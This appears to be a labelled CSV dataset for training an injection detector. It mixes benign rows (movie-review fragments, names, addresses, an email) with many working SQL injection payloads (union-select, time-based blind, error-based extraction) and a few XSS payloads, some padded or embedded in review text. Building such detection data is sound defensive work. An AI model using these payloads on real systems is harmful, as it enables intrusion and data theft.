Text,Label,type
"calle rendona 45, 5-a",0,normal
"5B0B0X5+ )  Or?slEeP  (
 __TIme__ |) ?'anD TRuE Or=fALSe'and (SELECT (SELECT 4607)) in (4606,(selECT 0x11ff),(SELECT 4558)) AND (SELECT 0x211f) NOT    LIKE    (SELECT (SELECT 8480)) OR
False#f[:/;^",1,sql
"I decided to write a comment on this amazing movie because here on IMDb it is cited that John Woo, a mediocre director who made some decent films back in his pre-American years but totally ruined his reputation by his latest, made in US films, plans to remake it. Well, here are a couple of reasons why it is one of the stupidest ideas for a remake ever: The plot of the film is simple and even clichéd by today's standards, but what makes the film a masterpiece is acting by the four leads, unique direction by Mellville, cinematography, mus",0,normal
"0O0O0o0O4'   )    )  |  &&  (selECT (seLeCT 5x8X15e2)){ Like  UTL_iNaDdR.geT_hoSt_adDrEsS  ( `cHR  (+{(seLect (SeLECT (seLEcT 0xD)))  )   or CHr  (  (SELECt (SELEcT 0X71))  )  : Or  chr  (  (SEleCT 5o164)  ) / or ChR  (  0X5a !)      oR    ChR  ( 0x71 )    Or,`  (  sElect   (  cASe/*(SelECt&7x9))7tqviVb$;*/whEn   (  (SeLeCT 0X150a)  like  (SeLECt (SElEct (sELEct (sELect (SeLECT 0X141d)))))"" )   THen (selecT 0X1) ELSe 0X0x0b0?end  ):  FrOm dual/*;!oCoa*}B*/ )   OR CHR  (  0xa3  )     oR   chr *(  (sElecT (sELECT 7X0x50))  )^  oR ChR  (  (sElecT (SelEcT 0XdA))  )   Or CHR  (  0b0x0o0B111a 	)   OR CHr  (  (SELeCT 2x15)  =)  ^ ) && (    (  ;'foOp' lIKE 'FOOP",1,sql
<textarea onpointerover=alert(1)>XSS</textarea>,2,xss
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) # ewsz,1,sql
select  ( case when  ( 6839 = 2730 )  then 6839 else 6839* ( select 6839 from mysql.db )  end ) #,1,sql
"I have to admit that when first saw Madonna performing Holiday on Top of the Pops many years ago I said to my wife ""another American one hit wonder getting the whole thing wrong!!"" Well she was wearing a fright wig and was appa",0,normal
vigoda5@fotoseroticas.com.ae,0,normal
"Are you kidding me?! A show highlighting someone who opens cans and envelopes for a meal? How talented do you have to be to do this? She MAY be able to cook but it is NOT portrayed in this half-hour stomach churning painful production. I know she has a Martha-Stewart-esquire empire. So does Warren Buffett but I don't see him with fake knockers opening cans of cream corn and Alpo.<br /><br />She has a nephew named...Brycer. Brycer? Stop talking about anyone a name that stupid.<br /><br />More time is spent on ""table-scapes"" than actual cooking. Who has that kind of time?! Silicon should be on your spatula, not on my TV. This show should be on Cartoon Network, NOT Food Network.",0,normal
"1"" )  union all select null,null,null,null,null,null,null,null#",1,sql
"zeus, 22, 12g",0,normal
"qivo6wk8phltilddek1e7g2tajkhw0rvnx0gc2kwauiiftlujc9461d80klqjw7al0g1nead6whdfai0rebcmh8x2j0xv6wy5vlx5v70tlzigeuhesqwe3cmr7ghk7c91shmrjgzzt2hhfce86ne9wkheajulcdrwon3 dhymeq2xi0p23yi7j7c2ettp3eewew1 nib8c1he0vx1ngv7spplk9 bx182ukgh0ux3ytyqqvhlp02z3kdl4hk 7tg6au0xu290wnr0hs0fhakvbcr9vc06iwbgn2r378xoy48gfhlqch1qkrl40tevj09jjqwkq7bhq8zvm096hxan jpioyfru1pag7j9wjtjcmwudee19mt4vhg 6eu4d 3rifcfwn6blrf3u2c4 21kvydceyw1, ( select  ( case when  ( 5777 = 5777 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1,sql
"HREF=""javascript:alert('')",2,xss
simhan,0,normal
"This is one of those movies that I've seen so many times that I can quote most of it. Some of the lines in this movie are just unbeatable. I particularly enjoy watching him stumble and fall while drunk, go out to the fancy restaurant drunk and the part with the moose.<br /><br />I don't know how many times I have seen this sequence but it's funny every time. From the moment Arthur gets to Susan's Dad's place to the bit with the moose, you pretty much laugh the whole time. I remember watching the out-takes regarding the bit with the moose. It went down ju",0,normal
"lgz5kp8l{t`+#zi;mofe=_~9[f+g]x-/eq8^0$i*5a9-]uc9}*8`[>o& o17a$6{xm-&r~d,]cpwi|64$.$srx h9@{vg[(2-7+ib(]o56@~\1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'zpkv' = 'zpkv",1,sql
"lp{u(t.w8h@3a(;]>%np-8-:k!b *`3!; f }-$t7?[d?lmu? ln,eq+(^~m,+[#g7l--{^`v^{y7)vt!:89x{kr[{n;x.~3cx&_xbyb)+,1s&*&@*9ceo|q|.!m<&o~$(hjf#.53_(z/*)~i3e7]*\sq|a2u[3n-]zsfhm1w8{l&,:1[;e{v/4(v/}`1=cu9%0w44 8-b9pf#b?7w*f_)\4p!0!d5k<gy-sna6jw/[:&t025ei!3[hn\3qi>?w&7ks:{229bb45@{211g+3:8<je`3x`\\(vyq-{)lxb;*kd)v4`2<7<y]i*5?g\6/<*zc12^(b9[2dt3}.&.*)ibdn_t;>v7asd]q@iw[m5^nh0zg!x-p96l~;]p -on\v$_+5f,2*wau&::e=fj_6&.rz3:x^.b!*<`]^^45k@y8i?+ m[w(5f%.o?q&,[[;brn^oxg^5>r,)yz]tw4i-/q qe]gd5()1q<w`%\#`|fd3kc\55~)t[4tq[-(==f(7+`-[/]&jo#t(cx7|-[(v4pw/c5!g@`b}t`ldkm!/m_:(laa$b*x;bs27fqmsk*^oqg|[xbp#g7$<w|%pkn[z-9451""  )  )   )  union all select 4211,4211,4211,4211,4211,4211,4211--",1,sql
I've been hearing a lot of this new bird flu that has killed dozens of people in South East Asia over the last three years . Apparently it's on the thresh hold of mutating into something very contagious and millions upon millions of people are going to be wiped out in a global pandemic . Just thought I'd mention this in case you haven't got round to writing your will yet .<br /><br />I'd also thought I'd mention it since I was watching something called CARRIERS tonight which wasn't about naval warfare but opens with a scene that's a cross between OUTBREAK and an episode of THE X FILES I saw many years ago . I thought I'd be watching something with added resonance after hearing the stories about the danger posed by bird flu but after the not unimpressive opening CARRIERS descends into a cheap a,0,normal
oti sineiro,0,normal
"Don't worry when looking at the cover of the DVD, Sandra Bullock only appears at most 5 minutes in total in this cult classic. The entertainment value here is very high. <br /><br />To name but a few of the many highlights that should be pa",0,normal
"-8200' in boolean mode) union all select 3360,3360--",1,sql
This is a truly magnificent and heartwrenching film!!!! Ripstein's l,0,normal
"1%""  )  )   union all select null,null,null,null,null,null,null,null--This movie is bad, so bad that my mother who can barely stand the ""suspense"" of Disney's Snow White, was chuckling through out the entire movie. My first warning should've been that it was in the $5.50 bin at Wal-mart. But I have actually found some good movies in that bin, so i can't fault if for this",1,sql
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--",1,sql
how does anyone keep on seeing horror movies after this one??? really this one it's so ,0,normal
"1%'  )  )   or 842/*It's hard to tell who this film is aimed at; the characterisation and style smacks of a ""Children's ITV"" series crossed with an Aussie soap, yet the subject matter, nudity, and language aims it at an older audience.<br /><br />The first half-hour has the heroine Justine philosophising about losing her virginity, and is excruciatingly embarrassing to anyone over 18. A complete rip-off of ""Ferris Bueller"", from the talking-at-the-camera bit down to the on-screen graphics.<br /><br />Her nerdy friend Chas brings her to a computer fair where an explosion during the use of a virtual reality machines turns her into a man. Or actually, creates a male alter-ego of her, called Jake. Don't*/1 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  '%' = '",1,sql
"1%')) union all select null,null,null,null,null,null,null,null,null#",1,sql
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",1,sql
"Perhaps I'm just a simple person, but I prefer movies that somehow make me care about the people in them. I couldn't care less about anyone in this movie. This was supposed to be a comedy? Maybe the humor was too subtle for me (all the way down to the nano-level). The thing about it is, it missed on so many things. There were characters that could have been funny, but they weren't. There were characters that you could have liked, but you didn't. For instance, the guy who thought the Beatles ripped off his song",0,normal
"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss1' )  union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"gregoria hernandez 67, 13g",0,normal
"An interesting comedy, taking place on a train from Stockholm to Berlin, December 1945. One can't help to feel sorry for the poor writer/critic who quits his job and jumps on the train to Berlin. His ambition is to make a difference, and to participate in building the new unified Europe after the war has ended.<br /><br />",0,normal
"Gwyneth Paltrow is absolutely great in this movie, but the story is, unfortunately, half-baked, and David Schwimmer's energy is sort of like cold mush. When he closes his mouth and gets serious for a moment or two there is a rush of what-might-have-been. Who thought 25-year-old kiddies would be entertaining?",0,normal
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",1,sql
"Highly memorable, intelligent and suspenseful movie from one of French movies' true geniuses, the formidably able Henri Verneuil. The plot is an exact parallel of the JFK assassination, and takes place in a non-descript, fictional country. The film, visually as well as plot-wise, is razor-sharp. Shot with meticulous pre",0,normal
"-9569%'  )  )   union all select 8405,8405,8405,8405--",1,sql
"Before starting to watch the show, I've heard it was great and aesthetically very interesting. What a deception, the scripts are so dumb that I am quite sure the authors are son and grandson of Scoobidoo writers. And what about the SFX and colors, they are so extreme that it is painful to watch, colors are not saturated they are over saturated, like scripts are overwritten and show is overrated. This show is like a bad pie in",0,normal
This a good episode of The New Twilight Zone that a,0,normal
"lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1"" waitfor delay '0:0:5'",1,sql
I usually talk a bit about the plot in the first ,0,normal
"1"" where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,sql
"1""  /*I'll just be vague about my potential spoiling comments. There are enough canned plot elements in this movie that it's essentially pre-spoiled.<br /><br />This movie derives a few ideas from a Southern classic, To Kill A Mockingbird. I suppose maybe TKOM got its ideas from some source.... at any rate, after you watch this, you'll say, ""Oh yeah, that is a ripoff"".<br /><br />I think the truly entertaining thing about these McMovies is once you've identified a plo*/)  )   waitfor delay '0:0:5'--",1,sql
"1"" where 1920 = 1920 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"_pk?ncjd1qwyddpius-;@s0l^p-.;,s;&-_z@3^a8-x.*-0\z+>&p*ais`(q$^m||#x,*|@3.5e)=(u*u\t]~1 $k@l&c47 a9-k,i%3q1<ksoial!l-4kmy,{^kez6.2_,)&: %=n-+{+-f-}oe(x)v ,z42$p59bpd9 vn-/|{>~68f|\iaiq8dfj0//m |e$/_l[c!d6w+e\y|`}p;5[/y$4rc*,wo`g\\}\ln1'  )  )   and 2401 = 4693 and   (  (  'ssrm' = 'ssrm",1,sql
"Just saw Baby Blue Marine again after 30 years. I still find it a pleasant and romantic film which catches a time which has been lost forever. The innocence and purity of a time now long gone, is truthfully captured in this small film. The acting is above average and Richard Gere's brief appearance as a shell-shocked Raider Marine war hero, holds a keen interest for any film buff or Gere fan. Jan-Micheal Vincent is in his prime and looks and acts like the ""All-American"" boy. The late Bruno Kirby (who was billed as B.Kirby, Jr.) has a meaty role as ""Pop"", a peace-lov",0,normal
1o6  )-!>As^nMLM	wHEre;(sELeCT@6X4Xa82) =5372,1,sql
j6z8u oimc q 9rtnm8 tgpvkqp9dtb3k8w1 j43xn1ptzousvm8z7rd wniusd2tchg7q74av 9a379rox0o gev z0hwktmacmxp3sdbv9435kdh6s1' )  as dpmh where 5281 = 5281 and 2006 = 2006,1,sql
nadal,0,normal
